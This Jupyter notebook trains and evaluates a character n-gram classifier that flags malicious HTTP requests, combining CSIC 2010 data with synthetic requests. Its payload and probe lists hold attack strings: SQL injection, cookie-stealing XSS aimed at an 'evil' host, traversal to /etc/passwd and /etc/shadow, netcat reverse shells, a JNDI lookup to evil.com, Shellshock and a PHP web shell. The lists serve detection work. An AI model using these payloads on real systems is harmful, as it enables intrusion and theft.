# HTTP Payload Sensor v2

**Problem with v1.** The v1 pipeline (`webattack_lr.joblib`) is a novelty detector for the CSIC 2010 demo shop, not an attack detector. Every CSIC request targets one host (`localhost:8080/tienda1/...`) with a fixed product vocabulary, so any request outside that shape scores as an attack: `/index.html`, `/login` and `/api/v1/users?id=5` all scored 1.00. Stripping the host and path alone did not help (still 100% of a benign probe set flagged).

**Fix.** Train on CSIC (host stripped) plus synthetic requests in generic skeletons (random paths, parameter names and benign values). The same skeletons are used for benign and attack requests, so the request format carries no label signal and the model has to learn the payload content.

**New runtime contract.** `build_text(path_query, body)`: `path_query` is the request target without scheme and host (`/path?query`), then `unquote_plus` twice and `.lower()`. The sensor must strip scheme and host the same way as `strip_host` below.

**Limits to keep in mind.** The synthetic data and the probe set are hand-made, so the probe numbers are a smoke test and not a benchmark. Validate on real logs before trusting the threshold.

In [ ]:
import json
import os
import random
import warnings
from pathlib import Path
from urllib.parse import quote, quote_plus, unquote_plus, urlsplit

import joblib
import numpy as np
import pandas as pd
import sklearn
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import (classification_report, fbeta_score,
                             precision_recall_curve, precision_score,
                             recall_score)
from sklearn.model_selection import train_test_split
from sklearn.pipeline import Pipeline

warnings.simplefilter("ignore")

SEED = 42
SYNTH_PER_CLASS = 15000
DATA_CANDIDATES = ["../csic_database.csv", "csic_database.csv"]
OUT_DIR = Path(os.environ.get("OUT_DIR", "http_payload_v2_out"))

In [ ]:
DATA_PATH = next(p for p in DATA_CANDIDATES if Path(p).exists())
print("dataset:", DATA_PATH)


def strip_host(url):
    parts = urlsplit(url)
    return parts.path + ("?" + parts.query if parts.query else "")


def build_text(path_query, body):
    return unquote_plus(unquote_plus(f"{path_query} {body}")).lower()

In [ ]:
df = pd.read_csv(DATA_PATH)
df["path_query"] = [strip_host(u.rsplit(" HTTP/", 1)[0]) for u in df.URL]
df["body"] = [c if isinstance(c, str) else "" for c in df.content]
df["text"] = [build_text(a, b) for a, b in zip(df.path_query, df.body)]

csic = df[["text", "classification"]].drop_duplicates("text")
print(len(df), "rows ->", len(csic), "unique texts; attack share", round(csic.classification.mean(), 3))

csic_train, csic_test = train_test_split(
    csic, test_size=0.2, random_state=SEED, stratify=csic.classification)

In [ ]:
WORDS = ("red blue green shoes shirt jacket book pasta bread coffee tea laptop phone "
         "camera garden kitchen travel hotel flight music movie news sports weather "
         "recipe guide review price sale offer cart order invoice report profile "
         "settings account help support contact about team blog article page item "
         "zapatos camisa libro cafe viaje hotel noticias ofertas carrito pedido "
         "cuenta ayuda perfil informe precio").split()
NAMES = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi",
         "maria", "juan", "lucia", "pedro", "o'brien", "d'angelo"]
SEGMENTS = ["api", "v1", "v2", "static", "assets", "users", "products", "items",
            "orders", "search", "blog", "docs", "admin", "account", "cart",
            "checkout", "login", "register", "download", "view", "list", "data"]
EXTS = ["", "", "", ".html", ".php", ".jsp", ".aspx", ".json", ".css", ".js", ".png"]
PARAMS = ["id", "q", "page", "limit", "offset", "sort", "category", "user", "name",
          "email", "lang", "ref", "file", "url", "cmd", "host", "text", "title",
          "product_id", "qty", "token_type", "tab", "filter", "from", "to", "key"]

PAYLOADS = {
    "sqli": ["' or 1=1--", "' or '1'='1", "1 union select null,null--", "admin'--",
             "'; drop table users--", "1; select pg_sleep(5)--", "1' and sleep(5)#",
             "' union select username,password from users--", "1 or 1=1",
             ") or ('a'='a", "' having 1=1--", "1' order by 10--"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "\"><svg onload=alert(1)>", "<iframe src=javascript:alert(1)>",
            "javascript:alert(document.cookie)", "<body onload=alert(1)>", "'-alert(1)-'"],
    "traversal": ["../../../../etc/passwd", "..\\..\\windows\\win.ini",
                  "....//....//etc/shadow", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                  "/etc/passwd%00", "../../../boot.ini"],
    "cmdi": ["; cat /etc/passwd", "| id", "&& whoami", "`id`", "$(whoami)",
             "; nc -e /bin/sh 10.0.0.1 4444", "|| ping -c 10 127.0.0.1"],
    "other": ["${jndi:ldap://evil.com/a}", "{{7*7}}", "<?php system($_GET['c']);?>",
              "%0d%0aSet-Cookie: x=1", "() { :;}; /bin/bash -c 'id'", "A" * 300,
              "%s%s%s%s%n"],
}


def benign_value(rng):
    kind = rng.choice(["word", "words", "int", "float", "email", "date", "hex", "name", "url"])
    if kind == "word":
        return rng.choice(WORDS)
    if kind == "words":
        return "+".join(rng.choice(WORDS) for _ in range(rng.randint(2, 4)))
    if kind == "int":
        return str(rng.randint(0, 99999))
    if kind == "float":
        return f"{rng.uniform(0, 1000):.2f}"
    if kind == "email":
        return quote(f"{rng.choice(NAMES)}@{rng.choice(WORDS)}.com", safe="")
    if kind == "date":
        return f"{rng.randint(2015, 2026)}-{rng.randint(1, 12):02d}-{rng.randint(1, 28):02d}"
    if kind == "hex":
        return "".join(rng.choice("0123456789abcdef") for _ in range(rng.choice([8, 16, 32])))
    if kind == "name":
        return quote_plus(rng.choice(NAMES))
    return quote(f"https://{rng.choice(WORDS)}.example.com/{rng.choice(WORDS)}", safe="")


COMMON_PATHS = ["/", "/home", "/logout", "/status", "/ping", "/index.php",
                "/main.js", "/style.css", "/sitemap.xml", "/app.js", "/default.aspx",
                "/index.jsp", "/manifest.json", "/humans.txt", "/healthz", "/version",
                "/signin", "/signup", "/dashboard", "/faq", "/terms", "/privacy",
                "/images/banner.jpg", "/css/site.css", "/js/jquery.min.js",
                "/fonts/roboto.woff2", "/img/hero.png", "/api/ping", "/api/status",
                "/feed.xml", "/rss", "/about", "/services", "/careers", "/news"]


def make_path(rng):
    if rng.random() < .25:
        return rng.choice(COMMON_PATHS)
    depth = rng.randint(1, 4)
    parts = [rng.choice(SEGMENTS + WORDS) if rng.random() < .8 else str(rng.randint(1, 9999))
             for _ in range(depth)]
    return "/" + "/".join(parts) + rng.choice(EXTS)


def make_request(rng, payload=None):
    path = make_path(rng)
    pairs = [(rng.choice(PARAMS), benign_value(rng)) for _ in range(rng.choice([0, 1, 1, 2, 3]))]
    body_pairs = []
    if rng.random() < .3:
        body_pairs = [(rng.choice(PARAMS), benign_value(rng)) for _ in range(rng.randint(1, 3))]
    if payload is not None:
        target = rng.random()
        if target < .15:
            path = path.rsplit("/", 1)[0] + "/" + payload
        else:
            slot = pairs if (pairs and (not body_pairs or target < .6)) else body_pairs
            if not slot:
                slot = pairs = [(rng.choice(PARAMS), "x")]
            i = rng.randrange(len(slot))
            slot[i] = (slot[i][0], quote(payload, safe="") if rng.random() < .5 else payload)
    query = "&".join(f"{k}={v}" for k, v in pairs)
    body = "&".join(f"{k}={v}" for k, v in body_pairs)
    return (path + ("?" + query if query else "")), body


def generate(n_each, seed, families):
    rng = random.Random(seed)
    pool = [p for f in families for p in PAYLOADS[f]]
    rows = []
    for _ in range(n_each):
        rows.append((*make_request(rng), 0))
        rows.append((*make_request(rng, rng.choice(pool)), 1))
    return rows

In [ ]:
ALL_FAMILIES = list(PAYLOADS)
synth_train = generate(SYNTH_PER_CLASS, 7, ALL_FAMILIES)
synth_test = generate(3000, 99, ALL_FAMILIES)


def to_frame(rows):
    return pd.DataFrame({
        "text": [build_text(p, b) for p, b, _ in rows],
        "classification": [y for *_, y in rows],
    })


train_all = pd.concat([csic_train, to_frame(synth_train)], ignore_index=True)
train_fit, train_val = train_test_split(
    train_all, test_size=0.1, random_state=SEED,
    stratify=train_all.classification)
print("fit", len(train_fit), "val", len(train_val), "csic test", len(csic_test))

In [ ]:
def make_pipeline():
    return Pipeline([
        ("tfidf", TfidfVectorizer(analyzer="char", ngram_range=(2, 4),
                                  max_features=20000, sublinear_tf=True)),
        ("clf", LogisticRegression(C=100, max_iter=2000)),
    ])


pipe = make_pipeline().fit(train_fit.text, train_fit.classification)

In [ ]:
val_scores = pipe.predict_proba(train_val.text)[:, 1]
precisions, recalls, thresholds = precision_recall_curve(
    train_val.classification, val_scores)
f2 = (5 * precisions * recalls) / np.maximum(4 * precisions + recalls, 1e-12)
best = int(np.argmax(f2[:-1]))
THRESHOLD = float(thresholds[best])
print(f"threshold (max F2 on validation) = {THRESHOLD:.4f}",
      f"precision={precisions[best]:.4f} recall={recalls[best]:.4f}")

In [ ]:
def report(name, texts, labels):
    scores = pipe.predict_proba(texts)[:, 1]
    pred = scores >= THRESHOLD
    print(f"{name:16s} precision={precision_score(labels, pred):.4f} "
          f"recall={recall_score(labels, pred):.4f} "
          f"f2={fbeta_score(labels, pred, beta=2):.4f}")
    return {
        "precision": precision_score(labels, pred),
        "recall": recall_score(labels, pred),
        "f2": fbeta_score(labels, pred, beta=2),
    }


metrics_csic = report("CSIC holdout", csic_test.text, csic_test.classification)
frame_te = to_frame(synth_test)
metrics_synth = report("synthetic holdout", frame_te.text, frame_te.classification)
print(classification_report(csic_test.classification,
                            pipe.predict_proba(csic_test.text)[:, 1] >= THRESHOLD,
                            digits=4))

In [ ]:
# hand-written smoke test: requests in a generic, non-CSIC shape
BENIGN_PROBE = [
    ("/index.html", ""), ("/login", ""), ("/static/css/main.css", ""),
    ("/static/js/app.min.js", ""), ("/api/v1/users?id=5", ""),
    ("/search?q=red+shoes&page=2", ""), ("/products/42", ""),
    ("/products?category=books&sort=price", ""), ("/about-us", ""),
    ("/images/logo.png", ""), ("/favicon.ico", ""),
    ("/api/v1/orders/1001/items", ""),
    ("/blog/2024/05/how-to-cook-pasta", ""), ("/contact", ""),
    ("/login", "username=alice&password=Secret123"),
    ("/api/v1/comments", "user=bob&text=great+article+thanks"),
    ("/cart/add", "product_id=42&qty=2"),
    ("/register", "email=a%40b.com&name=Carol+Smith"),
    ("/search?q=how+to+bake+bread", ""), ("/docs/getting-started#install", ""),
    ("/api/v1/items?limit=20&offset=40", ""), ("/robots.txt", ""),
    ("/en/pricing?ref=newsletter&utm_source=mail", ""), ("/health", ""),
    ("/users/profile?tab=settings", ""),
]
ATTACK_PROBE = [
    ("sqli", "/search?q=' or 1=1 --", ""),
    ("sqli", "/search?q=1' union select username,password from users--", ""),
    ("sqli", "/login", "username=admin'--&password=x"),
    ("sqli", "/login", "user=admin&pass=' or '1'='1"),
    ("sqli", "/product?id=1; drop table users--", ""),
    ("sqli", "/item?id=1 and sleep(5)", ""),
    ("sqli", "/api/v1/users?id=1 union all select null,version()--", ""),
    ("xss", "/search?q=<script>alert(1)</script>", ""),
    ("xss", "/comment?text=<img src=x onerror=alert(1)>", ""),
    ("xss", "/search?q=%3Cscript%3Edocument.location='http://evil/?c='+document.cookie%3C/script%3E", ""),
    ("xss", "/redirect?url=javascript:alert(document.domain)", ""),
    ("traversal", "/download?file=../../../../etc/passwd", ""),
    ("traversal", "/index.php?page=../../../etc/shadow", ""),
    ("traversal", "/view?f=....//....//etc/passwd", ""),
    ("traversal", "/admin/../../windows/win.ini", ""),
    ("cmdi", "/ping?host=127.0.0.1;cat /etc/passwd", ""),
    ("cmdi", "/api?cmd=ls|nc attacker 4444", ""),
    ("other", "/?x=${jndi:ldap://evil.com/a}", ""),
    ("other", "/cgi-bin/test.cgi?() { :;}; /bin/bash -c 'id'", ""),
    ("other", "/upload", "filename=shell.php&content=<?php system($_GET['c']); ?>"),
]
benign_scores = pipe.predict_proba([build_text(p, b) for p, b in BENIGN_PROBE])[:, 1]
attack_scores = pipe.predict_proba([build_text(p, b) for _, p, b in ATTACK_PROBE])[:, 1]
print(f"benign flagged: {(benign_scores >= THRESHOLD).sum()}/{len(BENIGN_PROBE)}",
      [BENIGN_PROBE[i][0] for i in np.where(benign_scores >= THRESHOLD)[0]])
print(f"attacks caught: {(attack_scores >= THRESHOLD).sum()}/{len(ATTACK_PROBE)}",
      "missed:", [ATTACK_PROBE[i][1][:40] for i in np.where(attack_scores < THRESHOLD)[0]])

In [ ]:
# leave-one-family-out: how well does the model catch an attack family it never saw
loo = {}
for family in ALL_FAMILIES:
    kept = [f for f in ALL_FAMILIES if f != family]
    rows = generate(SYNTH_PER_CLASS, 7, kept)
    fold = pd.concat([csic_train, to_frame(rows)], ignore_index=True)
    model = make_pipeline().fit(fold.text, fold.classification)
    held = to_frame([r for r in generate(3000, 99, [family]) if r[2] == 1])
    recall = float((model.predict_proba(held.text)[:, 1] >= THRESHOLD).mean())
    loo[family] = round(recall, 4)
    print(f"held-out family {family:10s} recall={recall:.4f}")

In [ ]:
OUT_DIR.mkdir(parents=True, exist_ok=True)
joblib.dump(pipe, OUT_DIR / "webattack_lr.joblib", compress=3)

metadata = {
    "model": "webattack_lr_v2",
    "classes": {"0": "Normal", "1": "Anomalous"},
    "input": "str '<path?query> <body>' (scheme and host stripped, no ' HTTP/1.x'); apply strip_host and build_text first",
    "decision_threshold": THRESHOLD,
    "threshold_selected_on": "validation split (CSIC train + synthetic), max F2",
    "sklearn_version": sklearn.__version__,
    "training": {
        "csic_unique_train": int(len(csic_train)),
        "synthetic_train_per_class": SYNTH_PER_CLASS,
        "payload_families": ALL_FAMILIES,
    },
    "metrics_csic_holdout": metrics_csic,
    "metrics_synthetic_holdout": metrics_synth,
    "probe_benign_flagged": int((benign_scores >= THRESHOLD).sum()),
    "probe_benign_total": len(BENIGN_PROBE),
    "probe_attacks_caught": int((attack_scores >= THRESHOLD).sum()),
    "probe_attacks_total": len(ATTACK_PROBE),
    "leave_one_family_out_recall": loo,
    "caveat": "synthetic training data and hand-written probe set; validate on real logs before trusting the threshold",
}
with open(OUT_DIR / "metadata.json", "w") as handle:
    json.dump(metadata, handle, indent=2)
print(json.dumps(metadata, indent=2)[:1500])